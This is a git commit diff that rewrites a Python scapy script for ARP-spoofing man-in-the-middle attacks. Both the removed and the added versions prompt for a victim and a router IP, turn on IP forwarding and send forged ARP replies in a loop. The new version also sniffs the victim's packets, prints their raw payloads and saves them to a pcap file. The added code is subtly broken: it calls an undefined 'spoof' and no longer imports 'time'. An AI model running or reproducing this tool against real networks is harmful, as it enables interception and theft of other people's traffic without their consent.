d1d1758cfa77282455a4dc8877acf952b89a8edf
Grester43hck <grester43hck@gmail.com>
2016-09-19 17:10:13 +0200

    holo

--- Python-1.py
+++ Python-1.py
@@ -1,65 +1,44 @@
-from scapy.all import *
-import sys
 import os
-import time
- 
-try:
-        interface = raw_input("[*] Enter Desired Interface: ")
-        victimIP = raw_input("[*] Enter Victim IP: ")
-        gateIP = raw_input("[*] Enter Router IP: ")
-except KeyboardInterrupt:
-        print "\n[*] User Requested Shutdown"
-        print "[*] Exiting..."
-        sys.exit(1)
- 
-print "\n[*] Enabling IP Forwarding...\n"
-os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
- 
-def get_mac(IP):
-        conf.verb = 0
-        ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
-        for snd,rcv in ans:
-                return rcv.sprintf(r"%Ether.src%")
- 
-def reARP():
-       
-        print "\n[*] Restoring Targets..."
-        victimMAC = get_mac(victimIP)
-        gateMAC = get_mac(gateIP)
-        send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
-        send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
-        print "[*] Disabling IP Forwarding..."
-        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-        print "[*] Shutting Down..."
-        sys.exit(1)
- 
-def trick(gm, vm):
-        send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
-        send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))
- 
-def mitm():
+import sys
+from scapy.all import*
+
+interface = raw_input("interface: \n")
+victimIP = raw_input("victim: \n")
+routerIP=raw_input("router: \n")
+
+def MACsnag(IP):
+    ans, unans = arping(IP)
+    for s, r in ans:
+        return r[Ether].src
+		
+def Spoof(routerIP, victimIP):
+    victimMAC = MACsnag(victimIP)
+    routerMAC = MACsnag(routerIP)
+    send(ARP(op =2, pdst = victimIP, psrc = routerIP, hwdst = victimMAC))
+    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = routerMAC))
+	
+def Restore(routerIP, victimIP):
+    victimMAC = MACsnag(victimIP)
+    routerMAC = MACsnag(routerIP)
+    send(ARP(op = 2, pdst = routerIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc= victimMAC), count = 4) 
+    send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)
+	
+def sniffer():
+    pkts = sniff(iface = interface, count = 10, prn=lambda x:x.sprintf(" Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
+    wrpcap("temp.pcap", pkts)
+	
+def MiddleMan():
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+    while 1:
         try:
-                victimMAC = get_mac(victimIP)
-        except Exception:
-                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")            
-                print "[!] Couldn't Find Victim MAC Address"
-                print "[!] Exiting..."
-                sys.exit(1)
-        try:
-                gateMAC = get_mac(gateIP)
-        except Exception:
-                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")            
-                print "[!] Couldn't Find Gateway MAC Address"
-                print "[!] Exiting..."
-                sys.exit(1)
-        print "[*] Poisoning Targets..."       
-        while 1:
-                try:
-                        trick(gateMAC, victimMAC)
-                        time.sleep(1.5)
-                except KeyboardInterrupt:
-                        reARP()
-                        break
-mitm()
+            spoof(routerIP, victimIP)
+            time.sleep(1)
+            sniffer()
+        except KeyboardInterrupt:
+            Restore(routerIP, victimIP)
+            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+            sys.exit(1)
 
 
+if __name__ == "__main__":
+    MiddleMan()
